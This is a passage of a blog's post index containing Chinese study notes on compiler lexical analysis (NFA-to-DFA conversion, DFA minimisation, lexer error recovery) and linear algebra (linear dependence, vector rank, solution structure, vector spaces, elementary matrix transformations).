src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_Lqp1XeFoJc.png"></p><blockquote><p>例：$r&#x3D;(a \mid b) * a b b$对应的<code>NFA</code></p></blockquote><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_6DX99HoNFh.png"></p><hr><h1 id="7-从NFA到DFA的转换"><a href="#7-从NFA到DFA的转换" class="headerlink" title="7 从NFA到DFA的转换"></a>7 从NFA到DFA的转换</h1><p><code>DFA</code>是<code>NFA</code>的特例，对每个<code>NFA</code>：N一定存在一个<code>DFA</code>：M，使得$L(M)&#x3D;L(N)$。</p><p>将<code>NFA</code>转换成接受同样语言的<code>DFA</code>的方法——<strong>子集法</strong>，与某一<code>NFA</code>等价的<code>DFA</code>不唯一。</p><h2 id="7-1-子集法"><a href="#7-1-子集法" class="headerlink" title="7.1 子集法"></a>7.1 子集法</h2><p>设NFA：$N&#x3D;\left(K, \sum, f, K_{0}, K_{t}\right)$，按如下办法构造一个DFA：$M&#x3D;\left(S, \Sigma, d, S_{0}, S_{t}\right)$，使得$L(M)&#x3D;L(N)$：</p><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_t7XJ-hwYLb.png"></p><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_8BsOcvQq8H.png"></p><h3 id="7-1-1-从带有-ε-边的-NFA到DFA的转换"><a href="#7-1-1-从带有-ε-边的-NFA到DFA的转换" class="headerlink" title="7.1.1 从带有 ε-边的 NFA到DFA的转换"></a>7.1.1 从带有 ε-边的 NFA到DFA的转换</h3><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_GMpUdu8LRE.png"></p><h3 id="7-1-2-子集构造法（subset-construction）"><a href="#7-1-2-子集构造法（subset-construction）" class="headerlink" title="7.1.2 子集构造法（subset construction）"></a>7.1.2 子集构造法（subset construction）</h3><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_PPWEf-zA0V.png"></p><h3 id="7-1-3-计算-ε-closure-T"><a href="#7-1-3-计算-ε-closure-T" class="headerlink" title="7.1.3 计算 ε-closure (T)"></a>7.1.3 计算 ε-closure (T)</h3><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_ThGCF-ch0m.png"></p><h2 id="7-2-NFA-和DFA的区别"><a href="#7-2-NFA-和DFA的区别" class="headerlink" title="7.2 NFA 和DFA的区别"></a>7.2 NFA 和DFA的区别</h2><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_lCSxubTw_f.png"></p><h2 id="7-3-DFA的化简"><a href="#7-3-DFA的化简" class="headerlink" title="7.3 DFA的化简"></a>7.3 DFA的化简</h2><p>通过消除无用状态和合并等价状态而转换成一个最小的与之等价的有穷自动机。</p><ul><li><strong>多余状态</strong>：从开始状态出发，任何输入串也不能到达的那个状态，或者从这个状态没有通路到达终态。</li><li><strong>等价状态</strong>：<code>T1</code>和<code>T2</code>同是终态或同是非终态，且<code>T1</code>出发对任意一个读入符号$a(a \in \Sigma)$和从<code>T2</code>出发读入a到达的状态等价。</li></ul><h3 id="7-3-1-分割法"><a href="#7-3-1-分割法" class="headerlink" title="7.3.1 分割法"></a>7.3.1 分割法</h3><p>把一个<code>DFA</code>（不含多余状态）的状态分成一些不相交的子集，使得任何不同的两个子集的状态都是可区别的，而同一子集中的任何两个状态都是等价的。</p><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_kQ9HS8H7XD.png"></p><p>最小状态<code>DFA</code>的定义：</p><ol><li>没有多余状态（死状态）</li><li>没有等价状态（不可区别）</li></ol><p>接受L的最小状态有穷自动机不计同构是唯一的。</p><hr><h1 id="8-识别单词的DFA"><a href="#8-识别单词的DFA" class="headerlink" title="8 识别单词的DFA"></a>8 识别单词的DFA</h1><blockquote><p>识别标识符的 <code>DFA</code></p></blockquote><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_BMSDmGNGXW.png"></p><blockquote><p>识别无符号数的 <code>DFA</code></p></blockquote><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_6Is4tnYd_D.png"></p><blockquote><p>识别无符号数的 <code>DFA</code></p></blockquote><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_nj96902jsn.png"></p><blockquote><p>识别各进制无符号整数的 <code>DFA</code></p></blockquote><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_YYtqIz2rOR.png"></p><blockquote><p>识别注释的 <code>DFA</code></p></blockquote><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_MXnba3nKgy.png"></p><blockquote><p>识别 Token的<code>DFA</code></p></blockquote><p><img src="/2024/06/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/image_LbSIhPHWpV.png"></p><h2 id="8-1-词法分析阶段的错误处理"><a href="#8-1-词法分析阶段的错误处理" class="headerlink" title="8.1 词法分析阶段的错误处理"></a>8.1 词法分析阶段的错误处理</h2><p>词法分析阶段可检测错误的类型：</p><ol><li>单词拼写错误</li><li>非法字符</li></ol><p>如果当前状态与当前输入符号在转换表对应项中的信息为空，而当前状态又不是终止状态，则调用错误处理程序。</p><h3 id="8-1-1-错误处理"><a href="#8-1-1-错误处理" class="headerlink" title="8.1.1 错误处理"></a>8.1.1 错误处理</h3><p>查找已扫描字符串中最后一个对应于某终态的字符：</p><ul><li>如果找到了，将该字符与其前面的字符识别成一个单词。然后将输入指针退回到该字符，扫描器重新回到初始状态，继续识别下一个单词</li><li>如果没找到，则确定出错，采用错误恢复策略</li></ul><h3 id="8-1-2-错误恢复策略"><a href="#8-1-2-错误恢复策略" class="headerlink" title="8.1.2 错误恢复策略"></a>8.1.2 错误恢复策略</h3><p>最简单的错误恢复策略：“恐慌模式（panic mode）”恢复。</p><p>从剩余的输入中不断删除字符，直到词法分析器能够在剩余输入的开头发现一个正确的字符为止。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性代数第4章：向量组的线性相关性</title>
      <link href="/2024/06/27/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%90%91%E9%87%8F%E7%BB%84%E7%9A%84%E7%BA%BF%E6%80%A7%E7%9B%B8%E5%85%B3%E6%80%A7/"/>
      <url>/2024/06/27/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%90%91%E9%87%8F%E7%BB%84%E7%9A%84%E7%BA%BF%E6%80%A7%E7%9B%B8%E5%85%B3%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="1-向量组及其线性组合"><a href="#1-向量组及其线性组合" class="headerlink" title="1 向量组及其线性组合"></a>1 向量组及其线性组合</h1><h2 id="1-1-向量"><a href="#1-1-向量" class="headerlink" title="1.1 向量"></a>1.1 向量</h2><blockquote><p>【定义1】n个有次序的数$a_{1}, a_{2}, \cdots, a_{n}$所组成的数组称为n维向量，这n个数称为该向量的n个分量，第i个数$a_i$称为第i个分量。</p></blockquote><h3 id="1-1-1-向量的表示法-xD"><a href="#1-1-1-向量的表示法-xD" class="headerlink" title="1.1.1 向量的表示法&#xD;"></a>1.1.1 向量的表示法&#xD;</h3><p>n维向量写成一行，称为行向量，也称为行矩阵，常用$a^{T}, {b}^{T}, \alpha^{T}, \beta^{T}$等表示，如$a^{T}&#x3D;\left(a_{1}, a_{2}, \cdots, a_{n}\right)$。</p><p>n维向量写成一列，称为列向量，也称为列矩阵，常用$a, {b}, \alpha, \beta$等表示。</p><p>说明：</p><ol><li>行向量和列向量总看成两个不同的向量。</li><li>行向量和列向量都按矩阵的运算法则进行运算。</li><li>在没有明确说明时，向量均理解为<strong>列向量</strong>。</li></ol><h2 id="1-2-向量组与矩阵的关系"><a href="#1-2-向量组与矩阵的关系" class="headerlink" title="1.2 向量组与矩阵的关系"></a>1.2 向量组与矩阵的关系</h2><p>由若干个同维数的列向量（或同维数的行向量）组成的集合，称为一个向量组。</p><p>反之，由有限个向量组成的向量组可以构成一个矩阵。</p><p><img src="/2024/06/27/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%90%91%E9%87%8F%E7%BB%84%E7%9A%84%E7%BA%BF%E6%80%A7%E7%9B%B8%E5%85%B3%E6%80%A7/image_m8wxyNoAjD.png"></p><h2 id="1-3-线性组合及线性表示"><a href="#1-3-线性组合及线性表示" class="headerlink" title="1.3 线性组合及线性表示"></a>1.3 线性组合及线性表示</h2><blockquote><p>【定义2】给定向量组$A: a_{1}, a_{2}, \cdots, a_{m}$，对于任何一组实数$k_{1}, k_{2}, \cdots, k_{m}$，表达式$k_{1} a_{1}+k_{2} a_{2}+\cdots+k_{m} a_{m}$称为向量组A的一个线性组合，$k_{1}, k_{2}, \cdots, k_{m}$称为这个线性组合的系数。</p></blockquote><p>给定向量组$A: a_{1}, a_{2}, \cdots, a_{m}$和向量b，如果存在一组实数$\lambda_{1}, \lambda_{2}, \cdots, \lambda_{m}$，使得</p><p>$$<br>b&#x3D;\lambda_{1} a_{1}+\lambda_{2} a_{2}+\cdots+\lambda_{m} a_{m}<br>$$</p><p>则向量b是向量A的<strong>线性组合</strong>，此时称向量b能由向量A<strong>线性表示</strong>。</p><blockquote><p>【定理1】向量b能由向量组$A: a_{1}, a_{2}, \cdots, a_{m}$线性表示的充要条件是：</p></blockquote><p>$$<br>R(A)&#x3D;R(A,b)<br>$$</p><p>相当于线性方程组有解。</p><blockquote><p>【定义3】设有两个向量组$A: a_{1}, a_{2}, \cdots, a_{m}$及$B: b_{1}, b_{2}, \cdots, b_{l}$，若向量组B中的每个向量都能由向量组A线性表示，则称<strong>向量组B能由向量组A线性表示</strong>。若向量组A与向量组B能相互表示，则称两个<strong>向量组等价</strong>。</p></blockquote><p>可以将向量组的线性组合、线性表示及等价的概念移用到线性方程组。</p><ul><li>对方程组A的各个方程作线性运算，所得到的方程称为方程组A的一个线性组合。</li><li>若方程组B的每个方程都是方程组A的线性组合，就称方程组b能由方程组A线性表示，此时方程组A的解一定是方程组B的解。</li></ul><p>若方程组A与方程组B能互相表示，就称这两个方程组可互推，<strong>互推的方程组一定同解</strong>。</p><blockquote><p>【定理3】向量$B: b_{1}, b_{2}, \cdots, b_{l}$能由向量组$A: a_{1}, a_{2}, \cdots, a_{m}$线性表示的充要条件是：</p></blockquote><p>$$<br>R(A)&#x3D;R(A,B)<br>$$</p><blockquote><p>【推论】向量组$A: a_{1}, a_{2}, \cdots, a_{m}$与向量组$B: b_{1}, b_{2}, \cdots, b_{l}$等价的充要条件是：</p></blockquote><p>$$<br>R(A)&#x3D;R(B)&#x3D;R(A,B)<br>$$</p><blockquote><p>【定理4】向量$B: b_{1}, b_{2}, \cdots, b_{l}$能由向量组$A: a_{1}, a_{2}, \cdots, a_{m}$线性表示，则：</p></blockquote><p>$$<br>R\left(b_{1}, b_{2}, \cdots, b_{l}\right) \leq R\left(a_{1}, a_{2}, \cdots, a_{m}\right)<br>$$</p><hr><h1 id="2-向量组的线性相关性"><a href="#2-向量组的线性相关性" class="headerlink" title="2 向量组的线性相关性"></a>2 向量组的线性相关性</h1><h2 id="2-1-线性相关的概念"><a href="#2-1-线性相关的概念" class="headerlink" title="2.1 线性相关的概念"></a>2.1 线性相关的概念</h2><p>【定义1】给定向量组$A: a_{1}, a_{2}, \cdots, a_{m}$，若存在不全为0的数$k_{1}, k_{2}, \cdots, k_{m}$，使</p><p>$$<br>k_{1} a_{1}+k_{2} a_{2}+\cdots+k_{m} a_{m}&#x3D;0<br>$$</p><p>则称向量组A是<strong>线性相关</strong>的，否则称它<strong>线性无关</strong>。</p><p><strong>注意：</strong></p><ol><li>向量组$A: a_{1}, a_{2}, \cdots, a_{m}$线性无关，则$k_{1}, k_{2}, \cdots, k_{m}$全为0</li><li>对任一向量组，不是线性相关的就是线性无关的</li><li>向量组只含有一个向量a时，若$a&#x3D;0$称向量组是线性相关的，饭之为线性无关</li><li>对于含有两个向量的向量组，它是线性相关的充分必要条件是两向量的分量对应成比例。几何意义是两向量共线。三个向量线性相关的几何意义是三向量共面。</li><li>包含零向量的向量组是线性相关的。</li></ol><h2 id="2-2-线性相关性的判定"><a href="#2-2-线性相关性的判定" class="headerlink" title="2.2 线性相关性的判定"></a>2.2 线性相关性的判定</h2><p>【定理1】向量组$a_{1}, a_{2}, \cdots, a_{m}(m \geq 2)$线性相关的充要条件是$a_{1}, a_{2}, \cdots, a_{m}$中至少有一个向量可由其余m-1个向量线性表示。</p><p>向量组的线性相关与线性无关的概念可以移用到线性方程组中。</p><p>当方程组中某个方程是其余方程的线性组合时，这个方程就是多余的，这时称方程组（各个方程）是线性相关的；</p><p>当方程组中没有多余的方程时，就称方程组（各个方程）线性无关（或线性独立）。</p><blockquote><p>向量组A线性相关$\longleftrightarrow$齐次线性方程组$Ax&#x3D;0$有非0解</p></blockquote><p>【定理2】向量组$a_{1}, a_{2}, \cdots, a_{m}$线性相关的充要条件是它所构成的矩阵$A&#x3D;\left(a_{1}, a_{2}, \cdots, a_{m}\right)$的秩小于向量的个数m，及$R(A)&lt;m$。</p><p>线性无关的充分必要条件是$R(A)&#x3D;m$。</p><p>【定理3】若向量组$A: a_{1}, a_{2}, \cdots, a_{m}$线性相关，则向量组$B: a_{1}, a_{2}, \cdots, a_{m}, a_{m+1}$也线性相关；反言之，如果向量组B线性无关，则向量组A也线性无关。</p><ul><li>m个n维向量构成的向量组，当n&lt;m时，一定线性相关。特别地，n+1个n维向量一定线性相关。</li></ul><p>即一个向量组若有线性相关的部分组，则该向量组线性相关。特别地，<strong>含有零向量的向量组一定线性相关</strong>。反之，若一个向量组线性无关，则它的任何部分组都线性无关。</p><hr><h1 id="3-向量组的秩"><a href="#3-向量组的秩" class="headerlink" title="3 向量组的秩"></a>3 向量组的秩</h1><h2 id="3-1-最大线性无关向量组"><a href="#3-1-最大线性无关向量组" class="headerlink" title="3.1 最大线性无关向量组"></a>3.1 最大线性无关向量组</h2><p>【定义1】设有向量组A，若在A中能够选出r个向量$a_{1}, a_{2}, \cdots, a_{r}$，满足：</p><ol><li>向量组$A_0：a_{1}, a_{2}, \cdots, a_{r}$都线性无关</li><li>向量组A中任意r+1个向量都线性相关</li></ol><p>那么称向量组$A_0$是向量组A的一个最大线性无关向量组（简称最大无关组）。</p><p>最大无关组中所含向量的个数r称为向量组A的秩，记为$R_A$。</p><ul><li>只含有零向量的向量组没有最大无关组，规定它的秩为0</li></ul><h2 id="3-2-矩阵的秩与向量组的秩"><a href="#3-2-矩阵的秩与向量组的秩" class="headerlink" title="3.2 矩阵的秩与向量组的秩"></a>3.2 矩阵的秩与向量组的秩</h2><p>对于只含有限个向量的向量组$A：a_{1}, a_{2}, \cdots, a_{r}$，它可以构成矩阵$A&#x3D;(a_{1}, a_{2}, \cdots, a_{m})$。</p><p>【定理1】矩阵的秩等于它的列向量组的秩，也等于它的行向量组的秩。</p><p>若$D_r$是矩阵A的一个最高阶非零子式：</p><ol><li>$D_r$所在的r列是A的列向量组的一个最大无关组</li><li>$D_r$所在的r行是A的行向量组的一个最大无关组</li></ol><p>说明：</p><ol><li>向量组的最大无关组不是唯一的</li><li>向量组A与它的最大无关组$A_0$等价（向量组与其最大无关组可以相互表示）</li></ol><h2 id="3-3-总结"><a href="#3-3-总结" class="headerlink" title="3.3 总结"></a>3.3 总结</h2><ol><li>最大线性无关向量组的概念——最大性、无关性</li><li>矩阵的秩与向量组的秩之间的关系</li><li>关于向量组秩的一些结论</li><li>求向量组的秩及其最大无关组的方法<ul><li>将向量组中的向量作为列向量构成一个矩阵；</li><li>对矩阵进行初等行变换化成行阶梯形矩阵，即可得到向量组的秩和最大无关组。</li></ul></li></ol><hr><h1 id="4-线性方程组的解的结构"><a href="#4-线性方程组的解的结构" class="headerlink" title="4 线性方程组的解的结构"></a>4 线性方程组的解的结构</h1><h2 id="4-1-齐次线性方程组的解的性质"><a href="#4-1-齐次线性方程组的解的性质" class="headerlink" title="4.1 齐次线性方程组的解的性质"></a>4.1 齐次线性方程组的解的性质</h2><p>【性质1】若$x&#x3D;\xi_{1}$，$x&#x3D;\xi_{2}$是齐次线性方程组的解，那么$x&#x3D;\xi_1+\xi_2$也是方程的解。</p><p>【性质2】若$x&#x3D;\xi_{1}$是齐次线性方程组的解，k为实数，那么$x&#x3D;k\xi_1$也是方程的解。</p><h2 id="4-2-基础解系及其求法"><a href="#4-2-基础解系及其求法" class="headerlink" title="4.2 基础解系及其求法"></a>4.2 基础解系及其求法</h2><p>齐次线性方程组的解集的最大无关组称为该方程组的<strong>基础解系</strong>。</p><p>由上面讨论知，要求齐次线性方程组的通解，只需求出它的基础解系即可。</p><p>【定理1】设$m \times n$矩阵A的秩$R(A)&#x3D;r$，则n元齐次线性方程组$Ax&#x3D;0$的解集S的秩</p><p>$$<br>R_s&#x3D;n-r<br>$$</p><ul><li>当$R(A)&#x3D;n$时，方程组只有零解，没有基础解系；</li><li>当$R(A)&#x3D;r&lt;n$时，方程组的基础解系中含有$n-r$个向量，此时任意$n-r$个线性无关的解均可构成它的基础解系，因此齐次线性方程组的基础解系不是唯一的，它的通解形式也不是唯一的。</li></ul><h2 id="4-3-非齐次线性方程组的解的性质"><a href="#4-3-非齐次线性方程组的解的性质" class="headerlink" title="4.3 非齐次线性方程组的解的性质"></a>4.3 非齐次线性方程组的解的性质</h2><p>设有非齐次线性方程组</p><p><img src="/2024/06/27/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%90%91%E9%87%8F%E7%BB%84%E7%9A%84%E7%BA%BF%E6%80%A7%E7%9B%B8%E5%85%B3%E6%80%A7/image_OsUxX12RQY.png"></p><p>将其写成向量方程$Ax&#x3D;b$，记为方程6。</p><p>【性质3】设$x&#x3D;\eta_{1}$及$x&#x3D;\eta_{2}$都是（6）的解，则$x&#x3D;\eta_1 - \eta_2$为对应的齐次线性方程组$Ax&#x3D;0$（记为方程7）的解。</p><p>【性质4】设$x&#x3D;\eta$是方程（6）的解，$x&#x3D;\xi$是方程（7）的解，则$x&#x3D;\xi+\eta$仍是（6）的解。</p><p>非线性方程组的通解为</p><p>$$<br>x&#x3D;k_1 \xi_1+k_{2} \xi_{2} + \cdots + k_{n-r} \xi_{n-r}+\eta^{*}<br>$$</p><p>其中$\xi_{1}, \xi_{2}, \cdots, \xi_{n-r}$是方程（7）的基础解系。</p><h2 id="4-4-总结"><a href="#4-4-总结" class="headerlink" title="4.4 总结"></a>4.4 总结</h2><p><img src="/2024/06/27/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%90%91%E9%87%8F%E7%BB%84%E7%9A%84%E7%BA%BF%E6%80%A7%E7%9B%B8%E5%85%B3%E6%80%A7/image_TOPGabU7u8.png"></p><p><img src="/2024/06/27/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%90%91%E9%87%8F%E7%BB%84%E7%9A%84%E7%BA%BF%E6%80%A7%E7%9B%B8%E5%85%B3%E6%80%A7/image_AsVwQcXAyf.png"></p><p><img src="/2024/06/27/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%90%91%E9%87%8F%E7%BB%84%E7%9A%84%E7%BA%BF%E6%80%A7%E7%9B%B8%E5%85%B3%E6%80%A7/image_hbZ5_YEIv3.png"></p><hr><h1 id="5-向量空间"><a href="#5-向量空间" class="headerlink" title="5 向量空间"></a>5 向量空间</h1><h2 id="5-1-向量空间的概念"><a href="#5-1-向量空间的概念" class="headerlink" title="5.1 向量空间的概念"></a>5.1 向量空间的概念</h2><p>【定义1】设V是n维向量的集合，若集合V非空，且集合V对向量的加法及数乘两种运算封闭，那么称集合V为<strong>向量空间</strong>。</p><p>集合V对加法和数乘封闭是指</p><ol><li>若$\alpha \in V$，$\beta \in V$，则有$\alpha + \beta \in V$</li><li>若$\alpha \in V$，$\lambda \in R$，则有$\lambda \alpha \in V$</li></ol><p>n维向量的集合是一个向量空间，记作$R^n$。</p><p><img src="/2024/06/27/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%90%91%E9%87%8F%E7%BB%84%E7%9A%84%E7%BA%BF%E6%80%A7%E7%9B%B8%E5%85%B3%E6%80%A7/image_eRhyUc8o2a.png"></p><p><img src="/2024/06/27/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E5%90%91%E9%87%8F%E7%BB%84%E7%9A%84%E7%BA%BF%E6%80%A7%E7%9B%B8%E5%85%B3%E6%80%A7/image_JHpkrh4i2u.png"></p><p>一般地，由向量组$a_{1}, a_{2}, \cdots, a_{m}$生成的向量空间为</p><p>$$<br>L&#x3D;{x&#x3D;\lambda_{1} a_{1}+\lambda_{2} a_{2}+\cdots+\lambda_{m} a_{m} \mid \lambda_{1}, \lambda_{2}, \cdots, \lambda_{m} \in \mathbb{R}}<br>$$</p><h2 id="5-2-向量空间的基与向量的坐标"><a href="#5-2-向量空间的基与向量的坐标" class="headerlink" title="5.2 向量空间的基与向量的坐标"></a>5.2 向量空间的基与向量的坐标</h2><p>【定义2】设V是向量空间，若存在r个向量$a_{1}, a_{2}, \cdots, a_{r} \in V$，且满足</p><ol><li>$a_{1}, a_{2}, \cdots, a_{r}$线性无关</li><li>V中任一向量均可由$a_{1}, a_{2}, \cdots, a_{r}$线性表示</li></ol><p>那么向量组$a_{1}, a_{2}, \cdots, a_{r}$就称为向量空间V的一个<strong>基</strong>，r称为向量空间V的<strong>维数</strong>，并称V为<strong>r维向量空间</strong>。</p><p>说明：</p><ol><li>只含有零向量的向量空间称为0维向量空间，因此它没有基。</li><li>若将向量空间看成向量组，那么V的基就是向量组的最大无关组，V的维数就是向量组的秩。</li><li>若向量组$a_1,a_2,…,a_r$是向量空间 V 的一个基，则 V 可以表示为</li></ol><p>$$<br>V&#x3D;\left{x&#x3D;\lambda_{1} a_{1}+\lambda_{2} a_{2}+\cdots+\lambda_{r} a_{r} \mid \lambda_{1}, \lambda_{2}, \cdots, \lambda_{r} \in \mathbb{R}\right}<br>$$</p><p>即 V 是基所生成的向量空间，由此得出了向量空间 V 的构造方法。</p><p>例如，齐次线性方程组的解空间$S&#x3D;{x|Ax&#x3D;0}$，若能找到解空间的一个基$\xi_{1}, \xi_{2}, \cdots, \xi_{n-r}$，则解空间为：</p><p>$$<br>S&#x3D;\left{x&#x3D;c_{1} \xi_{1}+c_{2} \xi_{2}+\cdots+c_{n-r} \xi_{n-r} \mid c_{1}, c_{2}, \cdots, c_{n-r} \in \mathbb{R}\right}<br>$$</p><p>【定义3】若在向量空间V中取定一个基$a_{1}, a_{2}, \cdots, a_{r}$，那么V中任意向量x可唯一标识为</p><p>$$<br>x&#x3D;\lambda_{1} a_{1}+\lambda_{2} a_{2}+\cdots+\lambda_{r} a_{r}<br>$$</p><p>其中数组$\lambda_{1}, \lambda_{2}, \cdots, \lambda_{r}$称为x在基$a_{1}, a_{2}, \cdots, a_{r}$中的<strong>坐标</strong>。</p><p>特别地，在 n 维向量空间$R^n$中，取单位坐标向量组$e_1,e_2,…e_n$为基，则以$x_1,x_2,…,x_n$为分量的向量$x$可表示为：</p><p>$$<br>x&#x3D;x_{1} e_{1}+x_{2} e_{2}+\cdots+x_{n} e_{n}<br>$$</p><p>可见向量在基$e_1,e_2,…e_n$中的坐标就是该向量的分量，因此$e_1,e_2,…e_n$称作$R^n$中的<strong>自然基</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线性代数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线性代数第3章：矩阵的初等变换与线性方程组</title>
      <link href="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/"/>
      <url>/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h1 id="1-矩阵的初等变换"><a href="#1-矩阵的初等变换" class="headerlink" title="1 矩阵的初等变换"></a>1 矩阵的初等变换</h1><h2 id="1-1-矩阵的初等变换"><a href="#1-1-矩阵的初等变换" class="headerlink" title="1.1 矩阵的初等变换"></a>1.1 矩阵的初等变换</h2><p>将解方程组的过程总结如下：</p><ol><li>解方程组的方法称为消元法；</li><li>解方程组时，始终将方程看成一个整体变形，并且用到了如下三种变换<ul><li>交换方程次序</li><li>以不为0的数乘某个方程</li><li>一个方程加上另一个方程的k倍</li></ul></li><li>上述3种变换都是可逆的，由此变换前与变换后的方程组同解。</li></ol><p>在上述变换过程中，只对方程组的系数和常数项进行运算，未知量并未参加运算，因此若记方程组的增广矩阵为：</p><p><img src="/2024/06/23/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0%E7%AC%AC3%E7%AB%A0%EF%BC%9A%E7%9F%A9%E9%98%B5%E7%9A%84%E5%88%9D%E7%AD%89%E5%8F%98%E6%8D%A2%E4%B8%8E%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/image_sZFFepmcBt.png"></p><p>则上述方程组的变换可转化为对矩阵B的变换。</p><h3 id="1-1-1-定义1"><a href="#1-1-1-定义1" class="headerlink" title="1.1.1 定义1"></a>1.1.1 定义1</h3><p>下列三种变换称为矩阵的初等行变换：</p><ol><li>对换2行</li><li>以数$k \neq 0$乘某一行中的所有元素</li><li>某一行所有元素的k倍加到另一行对应元素上去</li></ol><p>将定义中的“行”换成“列”，即得到矩阵的初等列变换的定义（所用记号是将“r”换成“c”）。</p><p>矩阵的初等行变换与初等列变换，统称为矩阵的<strong>初等变换</strong>。初等变换的逆变换也是初等变换，且与原变换的类型相同。</p><p>如果矩阵A经过有限次初等变换变成矩阵B，则称<strong>矩阵A与矩阵B等价</strong>，记作$A \sim B$。</p><p>矩阵之间的等价关系具有下列性质：</p><ol><li><strong>反身性</strong>：$A \sim A$</li><li><strong>对称性</strong>：若$A \sim B$，则$B \sim A$</li><li><strong>传递性</strong>：若$A \sim B$，$B \sim C$，则$A \sim C$</li></ol><p>具有上述三条性质的关系，在集合关系中称为<strong>等价关系</strong>。</p><p>两个方程组同解，可称为两个方程组等价。</p><p>下面利用矩阵的初等行变换来解线性方程组（1），其过程可与方程组（1）的消元过程一一对照：</p><p><img 